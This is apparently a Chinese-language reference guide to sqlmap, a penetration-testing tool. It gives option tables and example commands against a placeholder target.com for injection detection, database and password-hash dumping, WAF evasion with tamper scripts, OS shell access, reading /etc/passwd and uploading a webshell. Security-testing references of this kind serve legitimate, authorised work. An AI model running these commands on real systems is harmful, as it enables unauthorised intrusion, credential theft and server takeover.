# sqlmap

sqlmap 是一款自动化 SQL 注入检测与利用工具，支持多种数据库和注入技术。

## 基本语法

```bash
sqlmap -u "目标URL" [选项]
```

## 常用选项速查

### 目标设置

| 选项 | 说明 |
|------|------|
| `-u URL` | 目标 URL |
| `-m FILE` | 从文件读取多个目标 URL |
| `-r REQUESTFILE` | 从 HTTP 请求文件加载请求 |
| `-l LOGFILE` | 从 Burp/WebScarab 日志文件解析目标 |

### 请求配置

| 选项 | 说明 |
|------|------|
| `--data=DATA` | 通过 POST 发送数据 |
| `--cookie=COOKIE` | 设置 Cookie |
| `--user-agent=UA` | 自定义 User-Agent |
| `--random-agent` | 随机 User-Agent |
| `-H HEADER` | 添加请求头（可多次使用） |
| `--method=METHOD` | HTTP 方法（GET/POST） |
| `--proxy=PROXY` | 使用代理（如 `http://127.0.0.1:8080`） |
| `--delay=SEC` | 每个请求间隔（秒） |
| `--timeout=SEC` | 请求超时时间 |
| `--retries=N` | 失败重试次数 |

### 注入检测

| 选项 | 说明 |
|------|------|
| `-p PARAMETER` | 指定测试参数 |
| `--level=N` | 测试等级（1-5，默认 1） |
| `--risk=N` | 风险等级（1-3，默认 1） |
| `--technique=TECH` | 注入技术：B/E/U/S/T/Q（布尔/报错/联合/堆叠/时间/内联） |
| `--dbms=DBMS` | 指定数据库类型（如 mysql, mssql, oracle） |
| `--os=OS` | 指定操作系统（Windows/Linux） |
| `--batch` | 非交互模式，全部默认选择 |
| `--tamper=TAMPER` | 使用绕过脚本（逗号分隔多个） |

### 信息获取

| 选项 | 说明 |
|------|------|
| `--dbs` | 枚举数据库 |
| `--tables` | 枚举表 |
| `--columns` | 枚举列 |
| `-D DBNAME` | 指定数据库 |
| `-T TABLENAME` | 指定表 |
| `-C COLUMNS` | 指定列（逗号分隔） |
| `--dump` | 导出数据 |
| `--start=N` | 从第 N 条开始导出 |
| `--stop=N` | 到第 N 条结束导出 |
| `--sql-query=QUERY` | 执行自定义 SQL 语句 |
| `--current-user` | 获取当前用户 |
| `--current-db` | 获取当前数据库 |
| `--is-dba` | 判断是否为 DBA |
| `--users` | 枚举数据库用户 |
| `--passwords` | 枚举用户密码哈希 |
| `--privileges` | 枚举用户权限 |

### 系统访问

| 选项 | 说明 |
|------|------|
| `--os-shell` | 获取系统 shell |
| `--os-cmd=CMD` | 执行系统命令 |
| `--file-read=FILE` | 读取服务器文件 |
| `--file-write=FILE` | 写入文件到服务器 |
| `--file-dest=FILE` | 写入目标路径 |

### 输出

| 选项 | 说明 |
|------|------|
| `-v VERBOSE` | 详细级别（0-6，默认 1） |
| `--output-dir=DIR` | 输出目录 |
| `--csv-del=CHAR` | CSV 分隔符 |

## 常用示例

### 1. 基础检测

```bash
# 检测 GET 参数是否存在注入
sqlmap -u "http://target.com/page.php?id=1"

# 检测 POST 参数
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123" -p user

# 批量扫描
sqlmap -m targets.txt --batch
```

### 2. 使用请求文件

```bash
# 从 Burp 保存的请求文件加载（可以保留 Cookie、Header 等完整上下文）
sqlmap -r request.txt

# 指定参数并提高检测强度
sqlmap -r request.txt -p id --level=3 --risk=2
```

### 3. 获取数据

```bash
# 枚举数据库
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 枚举指定数据库的所有表
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 枚举指定表的所有列
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns

# 导出数据
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users -C username,password --dump
```

### 4. 绕过 WAF/IDS

```bash
# 使用单个 tamper 脚本
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# 组合多个 tamper 脚本
sqlmap -u "http://target.com/page.php?id=1" \
  --tamper=space2comment,randomcase,between,charencode

# 常用 WAF 绕过组合
sqlmap -u "http://target.com/page.php?id=1" \
  --tamper=space2comment,randomcase,versionedmore \
  --random-agent \
  --delay=1 \
  --level=3
```

### 5. 系统操作

```bash
# 执行系统命令
sqlmap -u "http://target.com/page.php?id=1" --os-cmd=whoami

# 获取交互式 shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# 读取服务器文件
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# 上传文件（写 Webshell）
sqlmap -u "http://target.com/page.php?id=1" \
  --file-write=shell.php --file-dest=/var/www/html/shell.php
```

## 常用 Tamper 脚本

| 脚本 | 用途 |
|------|------|
| `space2comment` | 空格替换为注释 `/**/` |
| `space2plus` | 空格替换为 `+` |
| `randomcase` | 关键字随机大小写 |
| `between` | 用 `BETWEEN` 替换 `>` |
| `charencode` | URL 编码 |
| `charunicodeencode` | Unicode 编码 |
| `versionedmore` | 版本注释绕过（MySQL） |
| `equaltolike` | `=` 替换为 `LIKE` |
| `apostrophemask` | 引号替换为 UTF-8 编码 |
| `base64encode` | Base64 编码参数值 |
| `commalesslimit` | 无逗号的 LIMIT（MySQL） |
| `greatest` | 用 `GREATEST` 替换 `>` |
| `modsecurityversioned` | ModSecurity 版本注释绕过 |
| `xforwardedfor` | 伪造 X-Forwarded-For 头 |

## 实用技巧

### level 与 risk 的选择

| 场景 | 建议 |
|------|------|
| 快速测试 | `--level=1 --risk=1` |
| 标准测试 | `--level=2 --risk=1` |
| 全面测试（可能触发 WAF） | `--level=3 --risk=2` |
| 深度测试（可能损坏数据） | `--level=5 --risk=3` |

### 绕过 WAF 的组合策略

```bash
sqlmap -u "http://target.com/page.php?id=1" \
  --tamper=space2comment,randomcase,between,charencode \
  --random-agent \
  --delay=0.5 \
  --level=3 \
  --risk=2
```

### Cookie 注入

```bash
sqlmap -u "http://target.com/page.php" --cookie="id=1" --level=2
```

> 需要 `--level=2` 或更高，sqlmap 才会测试 Cookie 参数。

### User-Agent / Referer 注入

```bash
sqlmap -u "http://target.com/page.php" \
  -H "User-Agent: 1" \
  -H "Referer: 1" \
  --level=3
```

> 需要 `--level=3` 才会测试 User-Agent 和 Referer 头。

### 从文件读取 SQL 语句执行

```bash
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT LOAD_FILE('/etc/passwd')"
```

## 注意事项

1. **授权测试**：仅在获得明确授权的系统上使用
2. **数据安全**：`--dump` 会下载数据到本地，注意保护
3. **风险控制**：`--risk=3` 可能使用 `OR` 条件导致数据库更新，谨慎使用
4. **速率控制**：务必设置 `--delay` 避免拖垮目标服务器
5. **日志暴露**：使用 `--proxy` 通过 Burp Suite 观察请求以便调试
